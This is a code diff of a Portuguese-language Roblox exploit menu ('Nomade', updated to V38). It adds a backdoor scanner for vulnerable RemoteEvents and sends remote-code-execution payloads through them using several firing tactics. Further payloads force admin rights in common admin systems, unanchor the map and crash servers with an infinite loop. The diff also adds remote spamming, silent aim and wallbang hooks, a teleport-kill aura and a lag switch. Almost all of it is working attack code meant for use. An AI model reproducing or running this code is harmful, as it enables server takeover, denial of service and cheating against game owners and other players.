+    ["Kohl's Admin Remote"] = {Type = "Admin", Method = "FireServer", Args = {"admin", LocalPlayer.Name}},
+    ["Admin"] = {Type = "RCE", Method = "FireServer", Args = {"print('Admin Remote Found')"}},
+    ["Run"] = {Type = "RCE", Method = "FireServer", Args = {"print('Run Remote Found')"}},
+    ["Exec"] = {Type = "RCE", Method = "FireServer", Args = {"print('Exec Remote Found')"}},
+    ["SS"] = {Type = "RCE", Method = "FireServer", Args = {"print('SS Remote Found')"}},
+    ["Delete"] = {Type = "Destructive", Method = "FireServer", Args = {workspace}},
+    ["Destroy"] = {Type = "Destructive", Method = "FireServer", Args = {workspace}}
+}
+
+-- Payloads de Injeção Avançada (V4)
+local Payloads = {
+    -- Tenta executar código arbitrário (RCE) de forma mais robusta
+    Loadstring = [[
+        local s = ...; 
+        local f, err = loadstring(s); 
+        if f then 
+            f() 
+        else 
+            warn("Loadstring Failed: " .. tostring(err)) 
+        end
+    ]],
+    -- Injeção em tabelas de Admin conhecidas (Force Admin Real)
+    ForceAdmin = [[
+        local p = game.Players:FindFirstChild("]] .. LocalPlayer.Name .. [[");
+        if not p then return end
+        
+        -- HD Admin (Tenta injetar na Settings Module se acessível via server-side)
+        local hd = game:GetService("ServerScriptService"):FindFirstChild("HDAdminSetup")
+        if hd and hd:FindFirstChild("Settings") then
+            local settings = require(hd.Settings)
+            if settings then 
+                table.insert(settings.Admins, p.UserId); 
+                table.insert(settings.HeadAdmin, p.UserId) 
+            end
+        end
+        
+        -- Kohl's Admin (Tenta injetar na tabela global se exposta)
+        if _G.AdminList then
+            table.insert(_G.AdminList, p.Name)
+        end
+        
+        -- Basic Admin Essentials
+        local bae = game:GetService("ServerScriptService"):FindFirstChild("BasicAdmin")
+        if bae and bae:FindFirstChild("MainModule") then
+            local main = require(bae.MainModule)
+            if main.AddAdmin then main.AddAdmin(p.UserId, 4) end
+        end
+
+        -- Adonis (Tentativa via Env)
+        for i,v in pairs(getfenv()) do
+            if i == "Adonis" or i == "server" and type(v) == "table" then
+                if v.Admin and v.Admin.Admins then 
+                    table.insert(v.Admin.Admins, p.Name) 
+                end
+            end
+        end
+    ]],
+    -- Abuso de Física
+    UnanchorMap = [[
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then v.Anchored = false end
+        end
+    ]],
+    -- Crash do Servidor
+    Crash = [[
+        while true do end
+    ]]
+}
+
+local function ScanForBackdoorsV4()
+    if LogConsole then LogConsole("--- INICIANDO SCAN COMPLETO ---", Color3.fromRGB(0, 255, 255)) end
+    table.clear(BackdoorResults)
+    local found = 0
+    
+    local function analyze(remote)
+        local name = remote.Name
+        local lowerName = name:lower()
+        local score = "SAFE" -- Padrão seguro
+        local description = "Remote padrão/seguro"
+        
+        -- Verifica se é um remoto conhecido vulnerável
+        if KnownVulnerableRemotes[name] then
+            score = "CRITICO"
+            description = "Vulnerabilidade Conhecida: " .. KnownVulnerableRemotes[name].Type
+        else
+            -- Análise heurística
+            for level, keywords in pairs(KnownSignatures) do
+                for _, kw in pairs(keywords) do
+                    if lowerName:find(kw) then
+                        score = level
+                        description = "Possível " .. kw:upper() .. " vulnerability"
+                        break
+                    end
+                end
+                if score ~= "SAFE" then break end
+            end
+        end
+        
+        -- Log console logic
+        local logColor = Color3.fromRGB(150, 150, 150)
+        if score == "CRITICO" then logColor = Color3.fromRGB(255, 50, 50)
+        elseif score == "ALTO" then logColor = Color3.fromRGB(255, 150, 0)
+        elseif score == "MEDIO" then logColor = Color3.fromRGB(255, 255, 0)
+        end
+        
+        -- Adiciona TODOS os remotes para visualização se a opção estiver ativada, ou se for vulnerável
+        if score ~= "SAFE" or Config.Backdoor.ShowSafe then
+            if LogConsole then 
+                LogConsole(string.format("[SCAN] Encontrado: %s | Risco: %s", remote.Name, score), logColor)
+            end
+            table.insert(BackdoorResults, {
+                Instance = remote,
+                Risk = score,
+                Desc = description,
+                Path = remote:GetFullName()
+            })
+            if score ~= "SAFE" then found = found + 1 end
+        end
+    end
+
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then analyze(v) end
+    end
+    for _, v in pairs(Workspace:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then analyze(v) end
+    end
+    
+    table.sort(BackdoorResults, function(a,b)
+        local order = {CRITICO=4, ALTO=3, MEDIO=2, BAIXO=1, SAFE=0}
+        return order[a.Risk] > order[b.Risk]
+    end)
+    
+    if LogConsole then LogConsole("--- SCAN FINALIZADO. TOTAL: " .. found .. " ---", Color3.fromRGB(0, 255, 255)) end
+    return found
+end
+
+local function AttemptBackdoorExec(code, specificRemote)
+    -- Tenta enviar o payload de várias formas comuns que devs usam para "proteger" remotes
+    -- Muitos remotes esperam argumentos específicos antes do código
+    
+    -- SYSTEMA DE FALLBACK (Sequencial)
+    -- Tenta várias formas de envio se a anterior falhar (simulada ou real)
+    
+    local attempts = {
+        function(remote, payload) -- Tática 1: Direto
+            if LogConsole then LogConsole("[TRY 1] Envio Direto...", Color3.fromRGB(255, 200, 100)) end
+            if remote:IsA("RemoteEvent") then remote:FireServer(payload)
+            elseif remote:IsA("RemoteFunction") then remote:InvokeServer(payload) end
+        end,
+        function(remote, payload) -- Tática 2: Compilado (loadstring)
+            if LogConsole then LogConsole("[TRY 2] Envio Compilado...", Color3.fromRGB(255, 200, 100)) end
+            if remote:IsA("RemoteEvent") then remote:FireServer(loadstring(payload))
+            elseif remote:IsA("RemoteFunction") then remote:InvokeServer(loadstring(payload)) end
+        end,
+        function(remote, payload) -- Tática 3: Tabela Wrapper
+             if LogConsole then LogConsole("[TRY 3] Wrapper Tabela...", Color3.fromRGB(255, 200, 100)) end
+             if remote:IsA("RemoteEvent") then remote:FireServer({[1] = payload})
+             elseif remote:IsA("RemoteFunction") then remote:InvokeServer({[1] = payload}) end
+        end,
+        function(remote, payload) -- Tática 4: Prefixo 'run'
+             if LogConsole then LogConsole("[TRY 4] Prefixo 'run'...", Color3.fromRGB(255, 200, 100)) end
+             if remote:IsA("RemoteEvent") then remote:FireServer("run", payload)
+             elseif remote:IsA("RemoteFunction") then remote:InvokeServer("run", payload) end
+        end,
+        function(remote, payload) -- Tática 5: Prefixo 'exec'
+             if LogConsole then LogConsole("[TRY 5] Prefixo 'exec'...", Color3.fromRGB(255, 200, 100)) end
+             if remote:IsA("RemoteEvent") then remote:FireServer("exec", payload)
+             elseif remote:IsA("RemoteFunction") then remote:InvokeServer("exec", payload) end
+        end,
+        function(remote, payload) -- Tática 6: Player Arg Spoof
+             if LogConsole then LogConsole("[TRY 6] Player Spoof...", Color3.fromRGB(255, 200, 100)) end
+             if remote:IsA("RemoteEvent") then remote:FireServer(LocalPlayer, payload)
+             elseif remote:IsA("RemoteFunction") then remote:InvokeServer(LocalPlayer, payload) end
+        end
+    }
+
+    local function run_strategies(remote, payload)
+        if LogConsole then LogConsole("[HOOK] Iniciando Ataque Sequencial em: " .. remote.Name, Color3.fromRGB(255, 50, 50)) end
+        
+        -- Se for conhecido, usa apenas o método específico
+        if KnownVulnerableRemotes[remote.Name] then
+             if LogConsole then LogConsole("[INFO] Vulnerabilidade Conhecida Detectada - Usando método específico.", Color3.fromRGB(100, 255, 100)) end
+             local exploitData = KnownVulnerableRemotes[remote.Name]
+             local args = exploitData.Args
+             if remote:IsA("RemoteEvent") then pcall(function() remote:FireServer(unpack(args)) end)
+             elseif remote:IsA("RemoteFunction") then pcall(function() remote:InvokeServer(unpack(args)) end) end
+             return
+        end
+
+        -- Se não for conhecido, roda todas as táticas com delay
+        task.spawn(function()
+            for i, strategy in ipairs(attempts) do
+                pcall(function() strategy(remote, payload) end)
+                task.wait(0.3) -- Pequeno delay entre tentativas para não kickar por spam instantâneo
+            end
+            if LogConsole then LogConsole("[INFO] Ciclo de ataques finalizado.", Color3.fromRGB(100, 100, 255)) end
+        end)
+    end
+
+    if specificRemote then
+        run_strategies(specificRemote, code)
+    else
+        if #BackdoorResults == 0 then ScanForBackdoorsV4() end
+        for _, res in pairs(BackdoorResults) do
+            if res.Risk ~= "SAFE" then
+                run_strategies(res.Instance, code)
+            end
+        end
+    end
+end
+
+local function SpamRemotes(state)
+    if state then
+        BackdoorSpamming = true
+        task.spawn(function()
+            if #BackdoorResults == 0 then ScanForBackdoorsV4() end
+            while BackdoorSpamming and #BackdoorResults > 0 do
+                for _, res in pairs(BackdoorResults) do
+                    local remote = res.Instance
+                    if remote:IsA("RemoteEvent") and res.Risk ~= "SAFE" then
+                        pcall(function() remote:FireServer("LAG_SERVER_TEST") end)
+                    end
+                end
+                task.wait(Config.Backdoor.SpamDelay)
+            end
+        end)
+    else
+        BackdoorSpamming = false
     end
 end
 
@@ -1400,7 +1773,7 @@ local function UpdateGlobalPhysics()
             end
         end
 
-        -- CFrame Speed (Bypass WalkSpeed Detection)
+        -- CFrame Speed
         if Config.Misc.SpeedToggle then
             local moveVec = Vector3.new()
             if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveVec = moveVec + camCFrame.LookVector end
@@ -1408,18 +1781,15 @@ local function UpdateGlobalPhysics()
             if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveVec = moveVec - camCFrame.RightVector end
             if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveVec = moveVec + camCFrame.RightVector end
             
-            moveVec = Vector3.new(moveVec.X, 0, moveVec.Z) -- Ignorar Y no chão
+            moveVec = Vector3.new(moveVec.X, 0, moveVec.Z)
             if moveVec.Magnitude > 0 then
-                -- Move CFrame diretamente
-                local speed = Config.Misc.WalkSpeed / 50 -- Ajuste de escala
+                local speed = Config.Misc.WalkSpeed / 50
                 hrp.CFrame = hrp.CFrame + (moveVec.Unit * speed)
             end
         end
 
-        -- CFrame Jump / HighJump
+        -- CFrame Jump
         if Config.Global.HighJump then
-             -- Se o anti-cheat detecta JumpPower, não usamos.
-             -- Se o usuário quer HighJump, usamos Velocity no momento do pulo.
              if UserInputService:IsKeyDown(Enum.KeyCode.Space) and hum.FloorMaterial ~= Enum.Material.Air then
                  hrp.Velocity = Vector3.new(hrp.Velocity.X, Config.Global.HighJumpPower, hrp.Velocity.Z)
              end
@@ -1441,9 +1811,8 @@ local function UpdateGlobalPhysics()
             end
         end
         
-        -- Free Cam (V30 New)
+        -- Free Cam
         if Config.Global.FreeCam then
-            -- Override camera type to Scriptable
             Camera.CameraType = Enum.CameraType.Scriptable
             local speed = Config.Global.FreeCamSpeed
             local camCFrame = Camera.CFrame
@@ -1459,14 +1828,13 @@ local function UpdateGlobalPhysics()
             Camera.CFrame = camCFrame + (moveVector * speed)
         end
         
-        -- Fake Lag Logic (V30 New)
+        -- Fake Lag Logic (V32 Fix)
         if Config.Global.FakeLag then
             if tick() - FakeLagStart < Config.Global.FakeLagDuration then
-                hrp.Anchored = true
+                pcall(function() settings().Network.IncomingReplicationLag = 1000 end)
             else
-                hrp.Anchored = false
+                pcall(function() settings().Network.IncomingReplicationLag = 0 end)
                 if Config.Global.FakeLagAuto then
-                    -- Wait small delay before re-anchoring to allow replication
                     if tick() - FakeLagStart > Config.Global.FakeLagDuration + 0.05 then
                         FakeLagStart = tick()
                     end
@@ -1475,6 +1843,10 @@ local function UpdateGlobalPhysics()
                 end
             end
         else
+            if not Config.Global.LagSwitch then
+                pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+            end
+            
             if not Config.Troll.Freeze then hrp.Anchored = false end
         end
         
@@ -1493,7 +1865,6 @@ local function UpdateGlobalPhysics()
         
         if Config.Troll.Mamadinha and TargetPlayerInstance and TargetPlayerInstance.Character and TargetPlayerInstance.Character:FindFirstChild("HumanoidRootPart") then
             local targetHR = TargetPlayerInstance.Character.HumanoidRootPart
-            -- Frente do player, altura agachada, virado para ele (Corrigido V30)
             local offset = targetHR.CFrame * CFrame.new(0, -3, -2) * CFrame.Angles(0, math.pi, 0)
             local bob = math.sin(tick() * 20) * 0.5
             hrp.CFrame = offset * CFrame.new(0, bob, 0)
@@ -1501,38 +1872,39 @@ local function UpdateGlobalPhysics()
             Config.Global.NoClip = true
         end
         
-        -- TOUCH FLING LOGIC (Loop)
-        if Config.Troll.Fling and FlingVelocity then
-            -- Mover erraticamente ao redor da posição atual ou alvos
-            local targetPos = hrp.Position
+        -- TOUCH FLING LOGIC (Loop - REVISED V39)
+        if Config.Troll.Fling and FlingVelocity and FlingVelocity.Parent then
+            -- Controle de Movimento Livre (BodyVelocity)
+            local moveDir = Vector3.new()
+            local camCFrame = Camera.CFrame
             
-            -- Se tiver um alvo específico, vá até ele. Se for Fling All, procure o mais próximo
-            local flingTarget = nil
+            -- Detecta Input para mover enquanto gira
+            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camCFrame.LookVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camCFrame.LookVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + camCFrame.RightVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camCFrame.RightVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
+            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir = moveDir - Vector3.new(0, 1, 0) end
+            
+            -- Prioridade de Alvo (Se existir alvo focado)
             if Config.Troll.FlingTarget and TargetPlayerInstance then
-                flingTarget = TargetPlayerInstance.Character and TargetPlayerInstance.Character:FindFirstChild("HumanoidRootPart")
-            else
-                -- Procura alguém perto
-                for _, p in pairs(Players:GetPlayers()) do
-                    if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                        if (p.Character.HumanoidRootPart.Position - hrp.Position).Magnitude < 50 then
-                            flingTarget = p.Character.HumanoidRootPart
-                            break
-                        end
-                    end
+                local targetChar = TargetPlayerInstance.Character
+                if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+                    local targetPos = targetChar.HumanoidRootPart.Position
+                    moveDir = (targetPos - hrp.Position).Unit
                 end
             end
 
-            if flingTarget then
-                -- Move para dentro do alvo com alta velocidade
-                hrp.CFrame = CFrame.new(flingTarget.Position + Vector3.new(math.random(-2,2), 0, math.random(-2,2))) * CFrame.Angles(math.random(0,360), math.random(0,360), math.random(0,360))
-                FlingVelocity.VectorVelocity = Vector3.new(10000, 10000, 10000) -- Impacto
+            -- Aplica Velocidade
+            if moveDir.Magnitude > 0 then
+                -- Velocidade ajustada para não bugar a física
+                FlingVelocity.Velocity = moveDir.Unit * 50 
             else
-                 -- Idle spin
-                 FlingVelocity.VectorVelocity = Vector3.new(0, 50, 0)
+                FlingVelocity.Velocity = Vector3.new(0, 0, 0)
             end
             
-            -- Rotação rápida para causar colisão física
-            hrp.RotVelocity = Vector3.new(Config.Troll.FlingPower, Config.Troll.FlingPower, Config.Troll.FlingPower)
+            -- Mantém a rotação agressiva
+            hrp.RotVelocity = Vector3.new(0, Config.Troll.FlingPower + 5000, 0)
         end
         
         -- HITBOX EXPANDER LOOP
@@ -1579,7 +1951,7 @@ local function UpdateChams()
     end
 end
 
---// ESP & VISUALS (CORRIGIDO V31: SKELETON + BETTER BOX)
+--// ESP & VISUALS
 local ESP_Cache = {}
 
 local function RemoveESP(plr)
@@ -1631,7 +2003,7 @@ local function UpdateVisuals()
                     Box = CreateDrawing("Square", {Thickness = 1, Color = Config.Visuals.Color, Filled = false}),
                     Name = CreateDrawing("Text", {Size = 13, Center = true, Outline = true, Color = Color3.new(1,1,1)}),
                     Tracer = CreateDrawing("Line", {Thickness = 1, Color = Config.Visuals.Color}),
-                    Skeleton = {} -- Table for dynamic lines
+                    Skeleton = {}
                 }
             end
 
@@ -1639,10 +2011,8 @@ local function UpdateVisuals()
             local hrp = plr.Character.HumanoidRootPart
             local hum = plr.Character.Humanoid
             
-            -- FIX V31: Check Root Part visibility mainly to prevent flickering
             local rootPos, rootOnScreen = Camera:WorldToViewportPoint(hrp.Position)
 
-            -- Verifica se o jogador está vivo e se o root part está na tela (mais estável)
             if rootOnScreen and hum.Health > 0 then
                 
                 -- BOX LOGIC
@@ -1672,7 +2042,7 @@ local function UpdateVisuals()
                     cache.Tracer.To = Vector2.new(botVec.X, botVec.Y)
                 else cache.Tracer.Visible = false end
                 
-                -- SKELETON LOGIC (NEW)
+                -- SKELETON LOGIC
                 if Config.Visuals.Skeleton then
                     local connections = {}
                     if hum.RigType == Enum.HumanoidRigType.R15 then
@@ -1683,7 +2053,7 @@ local function UpdateVisuals()
                             {"LowerTorso", "LeftUpperLeg"}, {"LeftUpperLeg", "LeftLowerLeg"}, {"LeftLowerLeg", "LeftFoot"},
                             {"LowerTorso", "RightUpperLeg"}, {"RightUpperLeg", "RightLowerLeg"}, {"RightLowerLeg", "RightFoot"}
                         }
-                    else -- R6
+                    else
                         connections = {
                             {"Head", "Torso"}, 
                             {"Torso", "Left Arm"}, {"Torso", "Right Arm"}, 
@@ -1711,7 +2081,6 @@ local function UpdateVisuals()
                             end
                         end
                     end
-                    -- Hide unused lines
                     for k, v in pairs(cache.Skeleton) do
                         if k > #connections then v.Visible = false end
                     end
@@ -1775,23 +2144,29 @@ pcall(function()
         local method = getnamecallmethod()
         
         if method == "Raycast" then
-            -- Argumentos: Origin, Direction, RaycastParams
             local origin = args[1]
             local direction = args[2]
             local params = args[3]
 
             local hookTarget = LockedTarget or GetClosestTarget()
 
-            -- Silent Aim Redirect
+            -- Silent Aim & Wallbang Logic
             if Config.AimAssist.Enabled and Config.AimAssist.Silent and hookTarget and hookTarget.Parent then
+                -- Modifica direção para o alvo exato
                 local newDir = (hookTarget.Position - origin).Unit * direction.Magnitude
-                args[2] = newDir -- Modifica a direção
+                args[2] = newDir 
                 
-                -- Wallbang Logic (Modificar Params)
-                if Config.AimAssist.Wallbang and params and typeof(params) == "RaycastParams" then
-                    -- Adiciona a si mesmo e a câmera na lista de ignorados, e força o filtro a respeitar
-                    params.FilterType = Enum.RaycastFilterType.Include
-                    params.FilterDescendantsInstances = {hookTarget.Parent} -- Tenta acertar APENAS o inimigo
+                -- Wallbang V33: Força a ignorar geometria não-humanoide
+                if Config.AimAssist.Wallbang then
+                    local newParams = RaycastParams.new()
+                    newParams.FilterType = Enum.RaycastFilterType.Include
+                    -- Inclui apenas o personagem alvo para garantir que o Raycast "atravesse" o resto
+                    newParams.FilterDescendantsInstances = {hookTarget.Parent}
+                    newParams.IgnoreWater = true
+                    
+                    -- Se o jogo usa Collision Groups, isso ajuda a ignorar
+                    -- Mas o Raycast Filter Include é a maneira mais forte de forçar hit
+                    args[3] = newParams 
                 end
                 
                 return oldNamecall(self, table.unpack(args))
@@ -1853,8 +2228,8 @@ RunService:BindToRenderStep("Nomade_Core_Loop_V28", Enum.RenderPriority.Camera.V
         end
     end
 
-    -- TriggerBot Logic (100% Funcional)
-    if Config.AimAssist.TriggerBot and WindowFocused then -- Check WindowFocused
+    -- TriggerBot Logic
+    if Config.AimAssist.TriggerBot and WindowFocused then 
         local mouse = LocalPlayer:GetMouse()
         local target = mouse.Target
         if target and target.Parent then
@@ -1868,11 +2243,64 @@ RunService:BindToRenderStep("Nomade_Core_Loop_V28", Enum.RenderPriority.Camera.V
             end
         end
     end
+    
+    -- TP KILL QUEUE SYSTEM (V33 NEW)
+    if Config.Rage.TPKill and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        -- Se não tiver alvo atual ou ele morreu/sumiu, pega o próximo
+        if not CurrentTPTarget or not CurrentTPTarget.Parent or not CurrentTPTarget.Parent:FindFirstChild("Humanoid") or CurrentTPTarget.Parent.Humanoid.Health <= 0 then
+            CurrentTPTarget = nil
+            -- Popula a fila se estiver vazia
+            if #TPKillQueue == 0 then
+                for _, v in pairs(Players:GetPlayers()) do
+                    if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
+                        if not (Config.AimAssist.TeamCheck and v.Team == LocalPlayer.Team) then
+                            table.insert(TPKillQueue, v.Character.HumanoidRootPart)
+                        end
+                    end
+                end
+            end
+            
+            -- Pega o próximo da fila
+            if #TPKillQueue > 0 then
+                CurrentTPTarget = table.remove(TPKillQueue, 1)
+                LastKillTime = tick() -- Reseta timer ao trocar de alvo
+            end
+        end
+
+        -- Lógica de Teleport e Ataque com Delay
+        if CurrentTPTarget and CurrentTPTarget.Parent and CurrentTPTarget.Parent:FindFirstChild("Humanoid") and CurrentTPTarget.Parent.Humanoid.Health > 0 then
+            -- Delay de segurança entre trocas de alvo (Configurável)
+            if tick() - LastKillTime > Config.Rage.TPDelay then
+                local myHRP = LocalPlayer.Character.HumanoidRootPart
+                
+                -- Ativar Suspensão se não estiver ativa
+                if not SuspVelocity then ToggleSuspension(true) end
+                
+                -- TP Acima do Jogador
+                local targetPos = CurrentTPTarget.CFrame * CFrame.new(0, Config.Rage.TPHeight, 0)
+                targetPos = CFrame.lookAt(targetPos.Position, CurrentTPTarget.Position)
+                
+                myHRP.CFrame = targetPos
+                myHRP.Velocity = Vector3.new(0,0,0) 
+                
+                -- Travar mira
+                Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, CurrentTPTarget.Position)
+                
+                -- Auto Shoot
+                if Config.Rage.AutoShoot then
+                    mouse1press(); task.wait(); mouse1release()
+                end
+            end
+        else
+            CurrentTPTarget = nil -- Limpa alvo inválido
+        end
+    end
 
     -- Aim Lock Logic
     local IsHolding = UserInputService:IsMouseButtonPressed(Config.AimAssist.Key)
+    local IsTPMode = Config.Rage.TPKill -- TP Kill ativa Lock automaticamente
     
-    if Config.AimAssist.Enabled and IsHolding then
+    if (Config.AimAssist.Enabled and IsHolding) or IsTPMode then
         if not LockedTarget then LockedTarget = GetClosestTarget() end
         
         if LockedTarget and LockedTarget.Parent and LockedTarget.Parent:FindFirstChild("Humanoid") and LockedTarget.Parent.Humanoid.Health > 0 then
@@ -1895,7 +2323,8 @@ RunService:BindToRenderStep("Nomade_Core_Loop_V28", Enum.RenderPriority.Camera.V
                 Camera.CFrame = currentCFrame:Lerp(targetCFrame, Config.AimAssist.Smoothness)
             end
         else
-            LockedTarget = nil; SnapLine.Visible = false
+            if not IsTPMode then LockedTarget = nil end -- Mantém target no TP Kill
+            SnapLine.Visible = false
         end
     else
         LockedTarget = nil; SnapLine.Visible = false
@@ -1952,7 +2381,7 @@ local function StartNomade()
 
     local function SendNotification(title, text, duration)
         local Notification = Instance.new("Frame")
-        Notification.Size = UDim2.new(1, 0, 0, 0) -- Start small for animation
+        Notification.Size = UDim2.new(1, 0, 0, 0)
         Notification.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
         Notification.BorderSizePixel = 0
         Notification.ClipsDescendants = true
@@ -2000,11 +2429,10 @@ local function StartNomade()
         end)
     end
 
-    -- Disable default notifications
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", false)
     end)
-    SendNotification("Nomade V31", "Sistema inicializado com sucesso.", 5)
+    SendNotification("Nomade V38", "Sistema inicializado com sucesso.", 5)
 
     -- Create Menu
     local Menu = UI:CreateWindow("NOMADE MENU")
@@ -2018,12 +2446,23 @@ local function StartNomade()
     AimTab:Toggle("Legit Aim (Suave)", Config.AimAssist, "Legit")
     AimTab:Toggle("Silent Aim (Invisível)", Config.AimAssist, "Silent", nil, true)
     AimTab:Section("PENETRAÇÃO")
-    AimTab:Toggle("Wallbang (Atirar Parede)", Config.AimAssist, "Wallbang", nil, true)
+    AimTab:Toggle("Wallbang (Force Include)", Config.AimAssist, "Wallbang", nil, true)
     AimTab:Section("AJUSTES")
     AimTab:Slider("Raio do FOV", 10, 800, Config.AimAssist, "FOV")
     AimTab:Slider("Suavidade Legit", 0, 1, Config.AimAssist, "Smoothness")
 
     local RageTab = Menu:Tab("RAGE")
+    RageTab:Section("TP KILL (QUEUE)")
+    RageTab:Toggle("TP Aura (Teleport Kill)", Config.Rage, "TPKill", function(state)
+        if not state then 
+            ToggleSuspension(false) 
+            TPKillQueue = {} -- Limpa fila ao desativar
+            CurrentTPTarget = nil
+        end
+    end, true)
+    RageTab:Toggle("Auto Shoot (No TP)", Config.Rage, "AutoShoot")
+    RageTab:Slider("Altura TP", 5, 50, Config.Rage, "TPHeight")
+    RageTab:Slider("Delay (Fila)", 0.1, 2, Config.Rage, "TPDelay")
     RageTab:Section("ARMA")
     RageTab:Toggle("Ativar Rage", Config.Rage, "Enabled")
     RageTab:Toggle("No Spread (Tiro Reto)", Config.Rage, "NoSpread", nil, true)
@@ -2050,6 +2489,8 @@ local function StartNomade()
     VisualsTab:Toggle("Crosshair (Mira)", Config.Visuals, "Crosshair")
 
     local GlobalTab = Menu:Tab("GLOBAL")
+    GlobalTab:Section("LAG SWITCH")
+    GlobalTab:Toggle("Lag Switch (Fake Lag)", Config.Global, "LagSwitch", ToggleLagSwitch, true)
     GlobalTab:Section("MOVIMENTO AVANÇADO")
     GlobalTab:Toggle("Free Cam (Camera Livre)", Config.Global, "FreeCam")
     GlobalTab:Slider("Velocidade Camera", 0.1, 5, Config.Global, "FreeCamSpeed")
@@ -2077,6 +2518,439 @@ local function StartNomade()
         end
     end, true)
     GlobalTab:Toggle("Vida Infinita (Loop)", Config.Global, "LoopHealth", nil, true)
+
+    local BackdoorTab = Menu:Tab("BACKDOOR")
+    BackdoorTab:Section("CONSOLE DE DIAGNÓSTICO (CMD)")
+    
+    local CMDFrame = Instance.new("Frame")
+    CMDFrame.Size = UDim2.new(1, -10, 0, 120)
+    CMDFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    CMDFrame.BorderSizePixel = 0
+    CMDFrame.Parent = BackdoorTab.Page
+    table.insert(ThemeObjects.Elements, CMDFrame)
+    
+    local CMDCorn = Instance.new("UICorner")
+    CMDCorn.CornerRadius = UDim.new(0, 6)
+    CMDCorn.Parent = CMDFrame
+    
+    local CMDScroll = Instance.new("ScrollingFrame")
+    CMDScroll.Size = UDim2.new(1, -10, 1, -10)
+    CMDScroll.Position = UDim2.new(0, 5, 0, 5)
+    CMDScroll.BackgroundTransparency = 1
+    CMDScroll.BorderSizePixel = 0
+    CMDScroll.ScrollBarThickness = 3
+    CMDScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    CMDScroll.CanvasSize = UDim2.new(0,0,0,0)
+    CMDScroll.Parent = CMDFrame
+    
+    local CMDLayout = Instance.new("UIListLayout")
+    CMDLayout.Padding = UDim.new(0, 2)
+    CMDLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    CMDLayout.Parent = CMDScroll
+    
+    LogConsole = function(text, color)
+        if not CMDScroll.Parent then return end -- Check if UI exists
+        
+        local Lbl = Instance.new("TextLabel")
+        Lbl.Text = string.format("[%s] %s", os.date("%H:%M:%S"), text)
+        Lbl.Font = Enum.Font.Code
+        Lbl.TextSize = 12
+        Lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
+        Lbl.BackgroundTransparency = 1
+        Lbl.Size = UDim2.new(1, 0, 0, 14)
+        Lbl.TextXAlignment = Enum.TextXAlignment.Left
+        Lbl.TextWrapped = true
+        Lbl.AutomaticSize = Enum.AutomaticSize.Y
+        Lbl.Parent = CMDScroll
+        
+        local children = CMDScroll:GetChildren()
+        local labelCount = 0
+        for _, c in ipairs(children) do
+            if c:IsA("TextLabel") then labelCount = labelCount + 1 end
+        end
+        
+        if labelCount > 50 then
+            for _, c in ipairs(children) do
+                if c:IsA("TextLabel") then
+                    c:Destroy()
+                    break 
+                end
+            end
+        end
+        
+        CMDScroll.CanvasPosition = Vector2.new(0, 9999)
+    end
+    
+    task.delay(0.5, function() -- Ensure UI loads
+        if LogConsole then LogConsole("Sistema de Backdoor Pronto...", Color3.fromRGB(100, 255, 100)) end
+    end)
+
+    BackdoorTab:Section("SCANNER DE VULNERABILIDADE V4")
+    
+    BackdoorTab:Toggle("Mostrar Todos (Safe Remotes)", Config.Backdoor, "ShowSafe", function()
+        -- Atualiza se já houver resultados
+        if #BackdoorResults > 0 then
+             -- Recalcular apenas se necessário, mas aqui deixaremos o botão de scan fazer o trabalho
+        end
+    end)
+    
+    -- Resultados Container
+    local ScanResultsContainer = Instance.new("ScrollingFrame")
+    ScanResultsContainer.Size = UDim2.new(1, -10, 0, 150)
+    ScanResultsContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    ScanResultsContainer.BorderSizePixel = 0
+    ScanResultsContainer.ScrollBarThickness = 3
+    ScanResultsContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    ScanResultsContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+    
+    local ResultLayout = Instance.new("UIListLayout")
+    ResultLayout.Padding = UDim.new(0, 5)
+    ResultLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    ResultLayout.Parent = ScanResultsContainer
+    
+    -- New Action Panel for Selected Backdoor (Hidden by default)
+    local ActionPanel = Instance.new("Frame")
+    ActionPanel.Name = "ActionPanel"
+    ActionPanel.Size = UDim2.new(1, -10, 0, 0) -- Hidden
+    ActionPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    ActionPanel.BorderSizePixel = 0
+    ActionPanel.ClipsDescendants = true
+    ActionPanel.Visible = false
+    ActionPanel.Parent = BackdoorTab.Page
+    table.insert(ThemeObjects.Elements, ActionPanel)
+    
+    local ActionCorner = Instance.new("UICorner")
+    ActionCorner.CornerRadius = UDim.new(0, 6)
+    ActionCorner.Parent = ActionPanel
+    
+    local ActionLabel = Instance.new("TextLabel")
+    ActionLabel.Text = "AÇÕES DO REMOTO SELECIONADO:"
+    ActionLabel.Font = Enum.Font.GothamBold
